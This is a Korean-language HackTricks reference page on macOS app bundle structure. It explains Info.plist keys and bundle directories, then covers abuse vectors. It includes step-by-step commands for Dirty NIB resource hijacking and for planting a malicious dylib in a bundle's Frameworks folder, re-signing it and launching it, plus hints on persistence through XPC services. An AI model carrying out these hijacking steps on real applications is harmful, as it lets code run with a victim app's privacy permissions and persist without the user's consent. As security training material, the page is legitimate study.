# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## 기본 정보

macOS의 Bundle은 애플리케이션, 라이브러리 및 기타 필요한 파일을 포함한 다양한 리소스의 컨테이너 역할을 하며, Finder에서는 익숙한 `*.app` 파일과 같이 단일 객체로 표시됩니다. 가장 흔히 접하는 Bundle은 `.app` Bundle이지만, `.framework`, `.systemextension`, `.kext`와 같은 다른 유형도 널리 사용됩니다.

### Bundle의 필수 구성 요소

Bundle 내부, 특히 `<application>.app/Contents/` 디렉터리에는 다양한 중요 리소스가 포함되어 있습니다.

- **\_CodeSignature**: 이 디렉터리에는 애플리케이션의 무결성을 확인하는 데 필요한 code-signing 정보가 저장됩니다. 다음과 같은 명령을 사용하여 code-signing 정보를 검사할 수 있습니다:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: 사용자 상호 작용 시 실행되는 애플리케이션의 executable binary를 포함합니다.
- **Resources**: 이미지, 문서 및 인터페이스 설명(nib/xib files)을 비롯한 애플리케이션의 user interface components를 보관합니다.
- **Info.plist**: 애플리케이션의 main configuration file 역할을 하며, 시스템이 애플리케이션을 올바르게 인식하고 상호 작용하는 데 중요합니다.

#### Info.plist의 Important Keys

`Info.plist` 파일은 애플리케이션 configuration의 핵심으로, 다음과 같은 keys를 포함합니다.

- **CFBundleExecutable**: `Contents/MacOS` directory에 있는 main executable file의 이름을 지정합니다.
- **CFBundleIdentifier**: 애플리케이션의 global identifier를 제공하며, macOS가 애플리케이션을 관리할 때 광범위하게 사용합니다.
- **LSMinimumSystemVersion**: 애플리케이션 실행에 필요한 macOS의 minimum version을 나타냅니다.

### Bundles 탐색

`Safari.app`과 같은 bundle의 contents를 탐색하려면 다음 command를 사용할 수 있습니다: `bash ls -lR /Applications/Safari.app/Contents`

이 탐색을 통해 `_CodeSignature`, `MacOS`, `Resources`와 같은 directories 및 `Info.plist`와 같은 files를 확인할 수 있습니다. 각 항목은 애플리케이션 보안 유지부터 user interface 및 operational parameters 정의까지 고유한 역할을 수행합니다.

#### Additional Bundle Directories

일반적인 directories 외에도 bundles에는 다음 항목이 포함될 수 있습니다.

- **Frameworks**: 애플리케이션이 사용하는 bundled frameworks를 포함합니다. Frameworks는 추가 resources가 포함된 dylibs와 같습니다.
- **PlugIns**: 애플리케이션의 capabilities를 확장하는 plug-ins 및 extensions를 위한 directory입니다.
- **XPCServices**: 애플리케이션이 process 외부 통신에 사용하는 XPC services를 보관합니다.

이 구조는 필요한 모든 components를 bundle 내부에 캡슐화하여 modular하고 secure한 애플리케이션 환경을 제공합니다.

`Info.plist` keys 및 그 의미에 대한 자세한 정보는 Apple developer documentation에서 광범위한 resources를 제공합니다: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: quarantined bundle이 처음 실행되면 macOS는 deep signature verification을 수행하고 randomized translocated path에서 실행할 수 있습니다. 승인된 후에는 이후 실행에서 shallow checks만 수행합니다. 과거에는 `Resources/`, `PlugIns/`, nibs 등의 resource files가 검사되지 않았습니다. macOS 13 Ventura부터는 첫 실행 시 deep check가 강제되고, 새로운 *App Management* TCC permission은 사용자 동의 없이 third-party processes가 다른 bundles를 수정하지 못하도록 제한합니다. 그러나 이전 systems는 여전히 취약합니다.
- **Bundle Identifier collisions**: 동일한 `CFBundleIdentifier`를 재사용하는 여러 embedded targets(PlugIns, helper tools)는 signature validation을 손상시키고 경우에 따라 URL-scheme hijacking/confusion을 활성화할 수 있습니다. 항상 sub-bundles를 열거하고 고유한 IDs를 검증해야 합니다.

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura 이전에는 signed app의 UI resources를 교체하면 shallow code signing을 우회하고 app의 entitlements를 사용하여 code execution을 수행할 수 있었습니다. 현재 research(2024)에 따르면 이 기법은 pre-Ventura 및 un-quarantined builds에서 여전히 작동합니다:<sup>[[1]](#references)[[2]](#references)</sup>

1. target app을 writable location(예: `/tmp/Victim.app`)으로 복사합니다.
2. `Contents/Resources/MainMenu.nib`(또는 `NSMainNibFile`에 선언된 모든 nib)를 `NSAppleScript`, `NSTask` 등을 instantiate하는 malicious nib로 교체합니다.
3. app을 실행합니다. malicious nib는 victim의 bundle ID 및 entitlements(TCC grants, microphone/camera 등)로 실행됩니다.
4. Ventura+에서는 첫 launch 시 bundle을 deep-verifying하고 이후 modifications에 *App Management* permission을 요구하여 이를 완화합니다. 따라서 persistence는 더 어려워지지만, 이전 macOS에서의 initial-launch attacks는 여전히 적용됩니다.<sup>[[1]](#references)</sup>

Minimal malicious nib payload example(`ibtool`로 xib를 nib로 compile):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundles 내부의 Framework / PlugIn / dylib Hijacking

`@rpath` 조회는 bundled Frameworks/PlugIns를 우선하므로, `Contents/Frameworks/` 또는 `Contents/PlugIns/` 내부에 malicious library를 배치하면 main binary가 library validation 없이 서명되었거나 `LC_RPATH` 순서가 취약할 때 load order를 redirect할 수 있습니다.

unsigned/ad-hoc bundle을 악용할 때의 일반적인 단계:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
참고:
- `com.apple.security.cs.disable-library-validation`이 없는 Hardened runtime은 third-party dylib를 차단하므로, 먼저 entitlements를 확인하세요.
- `Contents/XPCServices/` 아래의 XPC services는 종종 sibling frameworks를 로드하므로, persistence 또는 privilege escalation 경로를 위해 해당 바이너리도 유사하게 patch하세요.

## 빠른 Inspection Cheatsheet
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## 참고 문헌

- [1] [프로세스 injection을 view(s)로 가져오기: nib 파일을 사용한 macOS 앱 exploit (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB 및 bundle resource tampering write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
